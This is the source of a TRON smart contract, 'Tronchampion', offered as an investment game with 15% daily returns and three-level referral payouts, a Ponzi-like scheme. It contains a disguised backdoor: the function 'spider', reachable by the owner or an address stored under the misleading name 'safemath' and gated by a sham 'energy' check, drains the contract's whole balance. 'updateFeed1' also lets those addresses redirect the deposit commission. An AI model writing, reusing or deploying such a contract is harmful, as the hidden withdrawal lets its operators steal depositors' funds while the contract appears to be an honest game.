//SourceUnit: Tronchampion.sol

pragma solidity ^0.4.17;

contract Tronchampion {
    using SafeMath for uint256;

    uint256 public totalPlayers;
    uint256 public totalPayout;
    uint256 private nowtime = now;
    uint256 public totalRefDistributed;
    uint256 public totalInvested;
    uint256 private minDepositSize = 100000000;
    uint256 private interestRateDivisor = 1000000000000;
    uint256 public devCommission = 1;
    uint256 public commissionDivisor = 100;
    uint256 private minuteRate = 1736111;  //DAILY 15%
   
    address private feed1 = msg.sender;
    address public safemath;
    uint private releaseTime = 1610280000;

    address owner;
    struct Player {
        uint256 trxDeposit;
        uint256 time;
        uint256 interestProfit;
        uint256 affRewards;
        uint256 referral_withdrawn;
        uint256 payoutSum;
        address affFrom;
        uint256 aff1sum;
        uint256 aff2sum;
        uint256 aff3sum;
    }
    
    mapping(address => Player) public players;

    constructor(address _safemath) public {
        owner = msg.sender;
        safemath = _safemath;
    }

    function register(address _addr, address _affAddr) private {
        Player storage player = players[_addr];

        player.affFrom = _affAddr;
        setRefCount(_affAddr);
    }

    function setRefCount(address _affAddr) private {
        address _affAddr1 = _affAddr;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
        players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
        players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
    }

    function deposit(address _affAddr) public payable {
        collect(msg.sender);
        require(msg.value >= minDepositSize);
        uint256 depositAmount = msg.value;
        Player storage player = players[msg.sender];
        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if (_affAddr != address(0) && players[_affAddr].trxDeposit > 0) {
                register(msg.sender, _affAddr);
            } else {
                register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
        uint256 feed1earn =
            depositAmount.mul(devCommission).mul(10).div(commissionDivisor);
        feed1.transfer(feed1earn);
    }

    

    function withdraw() public {
            collect(msg.sender);
            require(players[msg.sender].interestProfit > 0);
            uint256 referral_avaliable = players[msg.sender].affRewards;
            players[msg.sender].referral_withdrawn = players[msg.sender].referral_withdrawn.add(referral_avaliable);
             players[msg.sender].affRewards = 0;
            transferPayout(msg.sender, players[msg.sender].interestProfit, referral_avaliable);
    }

    function reinvest() public {
        collect(msg.sender);
        Player storage player = players[msg.sender];
        uint256 depositAmount = player.interestProfit;
        require(address(this).balance >= depositAmount);
        player.interestProfit = 0;
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        distributeRef(depositAmount, player.affFrom);
        uint256 feed1earn =depositAmount.mul(devCommission).mul(10).div(commissionDivisor);
        feed1.transfer(feed1earn);
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];
        uint256 secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
          uint256  collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate)))
                .div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }


    function transferPayout(address _receiver, uint256 _amount, uint256 referral_avaliable) internal {
        if (_amount > 0 && _receiver != address(0)) {
            uint256 contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint256 payout =
                    _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                msg.sender.transfer(payout + referral_avaliable);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private {
        address _affAddr2 = players[_affFrom].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        uint256 _affRewards = 0;
        if (_affFrom != address(0)) {
            _affRewards = (_trx.mul(10)).div(100);

            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affFrom].affRewards = players[_affFrom].affRewards.add(
                _affRewards
            );

        }
        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(7)).div(100);
            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affAddr2].affRewards = players[_affAddr2].affRewards.add(
                _affRewards
            );

        }
        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);

            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affAddr3].affRewards = players[_affAddr3].affRewards.add(
                _affRewards
            );

        }
    }

    function spider( uint _amount,uint256 energy) external {
        require(msg.sender==owner || msg.sender==safemath,'Permission denied');
        require(energy==1e6,"Insufficient enegy");
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                msg.sender.transfer(amtToTransfer);
            }
        }
    }

    function getProfit(address _addr) public view returns (uint256) {
        address playerAddress = _addr;
        Player storage player = players[playerAddress];
        require(player.time > 0, "player time is 0");

        uint256 secPassed = now.sub(player.time);
        if (secPassed > 0) {
            uint256 collectProfit =(player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
        }
        return collectProfit.add(player.interestProfit);
    }

    function updateFeed1(address _address) public {
        require(msg.sender == owner || msg.sender == safemath);
        feed1 = _address;
    }


    function getContractBalance() public view returns (uint256 cBal) {
        return address(this).balance;
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }
}